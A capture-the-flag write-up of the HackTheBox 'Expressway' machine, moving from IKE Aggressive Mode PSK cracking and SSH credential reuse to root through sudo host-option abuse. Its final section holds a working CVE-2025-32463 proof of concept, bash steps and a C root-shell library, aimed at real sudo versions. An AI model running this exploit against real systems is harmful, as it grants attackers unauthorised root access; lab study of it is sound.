# Expressway

> [https://app.hackthebox.com/machines/Expressway](https://app.hackthebox.com/machines/Expressway)

<img width="1006" height="362" alt="capa" src="https://github.com/user-attachments/assets/e29c1084-817b-4e71-971e-607409ee5dd2" />

## Table of Contents

* [About](#about)
* [References](#references)
* [Reconnaissance](#reconnaissance)
* [Exploiting IKE](#exploiting-ike)
* [SSH Access](#ssh-access)
* [Internal Enumeration](#internal-enumeration)
* [Privilege Escalation](#privilege-escalation)
* [CVE-2025-32463](#cve-2025-32463)
* [Conclusion](#conclusion)

## About

Expressway is a debian machine centered on IKE/IPsec enumeration and exploitation. The initial attack vector involves abusing IKE Aggressive Mode on UDP/500 to extract and crack a pre-shared key, which is reused for SSH access. Post-compromise, the machine requires internal enumeration and log analysis to identify a hidden host-based sudo rule. Privilege escalation is achieved by exploiting sudo host restrictions and vulnerable sudo behavior

## References

* [Manual: sudoers](https://man7.org/linux/man-pages/man5/sudoers.5.html)
* [Kali Tools: ike-scan](https://www.kali.org/tools/ike-scan/)
* [Squid: Documentation](https://www.squid-cache.org)
* [WikiPedia: Internet Key Exchange](https://en.wikipedia.org/wiki/Internet_Key_Exchange)
* [Ubuntu Security: CVE-2025-32463](https://ubuntu.com/security/CVE-2025-32463)
* [ThreatNinja: Abusing CVE-2025-32463](https://threatninja.net/abusing-sudos-chroot-cve-2025-32463-explained/)
* [HackTricks: Pentesting IPSEC / IKE / VPN](https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html)
* [Sudo: Local Privilege Escalation via host option](https://www.sudo.ws/security/advisories/host_any/)

## Reconnaissance

Initial port scanning revealed a single open TCP port: __22 (OpenSSH)__. UDP scanning with Nmap identified port __500__ open and responding as ISAKMP (IKE). Given the machine’s *500* logo on HackTheBox, this suggested IKE/IPsec as a likely attack surface.

<img width="1768" height="498" alt="0" src="https://github.com/user-attachments/assets/eb1aae64-bfca-46f4-8420-2a9ad4cd4bf2" />

From [book.hacktricks.wiki](https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html):

*"IPsec is widely recognized as the principal technology for securing communications between networks (LAN-to-LAN) and from remote users to the network gateway (remote access), serving as the backbone for enterprise VPN solutions.*

*The establishment of a security association (SA) between two points is managed by IKE, which operates under the umbrella of ISAKMP, a protocol designed for the authentication and key exchange. This process unfolds in several phases:*

* *Phase 1: A secure channel is created between two endpoints. This is achieved through the use of a Pre-Shared Key (PSK) or certificates, employing either main mode, which involves three pairs of messages, or aggressive mode.*

* *Phase 1.5: Though not mandatory, this phase, known as the Extended Authentication Phase, verifies the identity of the user attempting to connect by requiring a username and password.*

* *Phase 2: This phase is dedicated to negotiating the parameters for securing data with ESP and AH. It allows for the use of algorithms different from those in Phase 1 to ensure Perfect Forward Secrecy (PFS), enhancing security."*

## Exploiting IKE

The first step was to identify an acceptable transform; I used [ike-scan](https://www.kali.org/tools/ike-scan/) in __Aggressive Mode__ to elicit identifying information from the endpoint.

* __Main Mode__: exchanges identities only after an encrypted channel is established (provides stronger confidentiality).

* __Aggressive Mode__: reduces message round-trips and reveals identity and other parameters early (faster but leaks data and enables offline attacks).

The server responded and leaked an identity (__ike@expressway.htb__), crypto parameters (__3DES/SHA1, MODP1024__), and indicated the aggressive-mode handshake completed (__1 returned handshake; 0 returned notify__). This confirmed the target accepted at least one of the proposed transforms and used __Auth=PSK__, i.e., authentication via a Pre-Shared Key.

With that information I used the `--pskcrack` option to extract the SHA1-based PSK material from the handshake.

<img width="1895" height="613" alt="1" src="https://github.com/user-attachments/assets/93abe238-d371-4ee1-a152-0ea3b22c7b8b" />

## SSH Access

After extracting the PSK, I attempted an offline crack with _hashcat_. Using the _rockyou.txt_ wordlist revealed the plaintext secret: `freakingrockstarontheroad`.

<img width="1902" height="933" alt="2" src="https://github.com/user-attachments/assets/f726a830-bacd-4dc5-8014-4eada3d95004" />

Because the PSK was reused as a user password, I was able to authenticate over SSH to the machine as __ike__ using the same string.

<img width="1904" height="810" alt="3" src="https://github.com/user-attachments/assets/2ca4219e-06b3-4170-a11a-81e97953d9dd" />

## Internal Enumeration

After some time hitting dead ends, I restarted enumeration and noticed that the __ike__ user belonged to an uncommon group: __13 (proxy)__. Searching for files owned by that group revealed several Squid-related files; `cache.log` contained service information and `access.log` included HTTP request details.

* __/var/spool/squid/netdb.state__
* __/var/log/squid/cache.log.2.gz__
* __/var/log/squid/access.log.2.gz__
* __/var/log/squid/cache.log.1__
* __/var/log/squid/access.log.1__

From [squid-cache.org](https://www.squid-cache.org):

*"Squid is a caching proxy for the Web supporting HTTP, HTTPS, FTP, and more. It reduces bandwidth and improves response times by caching and reusing frequently-requested web pages. Squid has extensive access controls and makes a great server accelerator. It runs on most available operating systems, including Windows, and is licensed under the GNU GPL."*

<img width="1904" height="413" alt="4" src="https://github.com/user-attachments/assets/5a98d902-e438-4178-9394-4a4828733fbe" />

Two additional observations were relevant: the __ike__ user’s `$PATH` prioritized __/usr/local/bin__ and there were two different _sudo_ binaries present (__/usr/local/bin/sudo__ and __/usr/bin/sudo__) with different versions.

<img width="1310" height="375" alt="5" src="https://github.com/user-attachments/assets/b1fd2e6c-2dc5-4813-a2f9-bcae6b328531" />

## Privilege Escalation

While analyzing _access.log.1_ I discovered the subdomain `offramp.expressway.htb`. Initially there was no reference to this host in local configuration files, and the presence of other services and ports made the attack surface unclear.

```log
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
```

After exhausting other vectors, the remaining candidate was a __sudo host-restriction__. Given the two _sudo_ binaries on the system with differing versions, this became the most likely privilege-escalation path.

From [www.sudo.ws](https://www.sudo.ws/security/advisories/host_any/):

*"Sudo’s host (__-h__ or __--host__) option is intended to be used in conjunction with the list option (-l or --list) to list a user’s sudo privileges on a host other than the current one. However, due to a bug it was not restricted to listing privileges and could be used when running a command via sudo or editing a file with sudoedit."*

Sudo versions *1.8.8* to *1.9.17* inclusive are affected. Using the `-h` flag on a vulnerable binary allowed me to execute commands as root under the __offramp.expressway.htb__ host context, retrieve the root flag, and complete the challenge.

<img width="1394" height="313" alt="6" src="https://github.com/user-attachments/assets/cfcf72bd-8421-47cc-a4c1-a5713882e78a" />

The sudoers entries grant __ike__ full, passwordless root privileges only when the local host identity matches __offramp.expressway.htb__ (the `SERVERS, !PROD` expression reduces to that single FQDN).
At runtime, *sudo* matches the machine’s perceived hostname (hostname/FQDN, NSS/DNS, or SSSD/LDAP sources) against the rule’s host field before authorizing commands.

In practice an attacker can satisfy this by making the host report that FQDN (or, on vulnerable sudo versions, abusing `sudo --host` / `-h` to consult remote-host rules) so the NOPASSWD rule applies.

#### /etc/sudoers:

```
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

Defaults        use_pty

Host_Alias     SERVERS        = expressway.htb, offramp.expressway.htb
Host_Alias     PROD           = expressway.htb
ike            SERVERS, !PROD = NOPASSWD:ALL
ike         offramp.expressway.htb  = NOPASSWD:ALL

root    ALL=(ALL:ALL) ALL
%sudo   ALL=(ALL:ALL) ALL

@includedir /etc/sudoers.d
```

## CVE-2025-32463

_sudo_ versions prior to __1.9.17p1__ are vulnerable because `sudo -R` (the chroot option) can cause _sudo_ to consult an _nsswitch.conf_ file from a user-controlled directory, resulting in untrusted NSS modules being loaded from within the chroot.

The PoC creates a custom _nsswitch.conf_ that points NSS lookups at a controlled directory containing a malicious `libnss_*.so.2`, compiles that shared object with an `-init/constructor` function, and then invokes `sudo -R <dir> /bin/true` to force _sudo_ to chroot and load the attacker-controlled library.

```bash
mkdir -p evil/etc libnss_
echo "passwd: /exploit" > evil/etc/nsswitch.conf
cp /etc/group evil/etc/

gcc -shared -fPIC -Wl,-init,exploit -o libnss_/exploit.so.2 exploit.c

sudo -R evil /bin/true
```

When the shared object is loaded the constructor performs `setreuid(0,0); setregid(0,0)` and `execl("/bin/bash", "/bin/bash", NULL);`, which escalates to __UID 0__ and spawns a root shell.

```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void exploit(void) {
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    execl("/bin/bash", "/bin/bash", NULL);
}
```

<img width="1906" height="385" alt="7" src="https://github.com/user-attachments/assets/4ed6b634-a2e5-4236-b8c7-3c76c824ec7b" />

## Conclusion

The Expressway machine demonstrated an attack chain from protocol enumeration to full root compromise. Key takeaways:

* __UDP/IKE enumeration uncovered the primary vector__: ISAKMP on UDP/500 and an Aggressive Mode response leaked the PSK identity and material.

* __Offline PSK cracking + credential reuse__ allowed direct SSH access (the cracked PSK was reused as a user password).

* __Log analysis revealed the escalation pivot__: readable Squid logs exposed __offramp.expressway.htb__, the exact FQDN used in host-restricted sudo rules.

* __Host-restricted sudo and local sudo bugs enabled privilege escalation__: multiple sudo binaries and a vulnerable __--host__/__-h__ behavior (and the __-R__/chroot NSS loading issue) were used to obtain root.
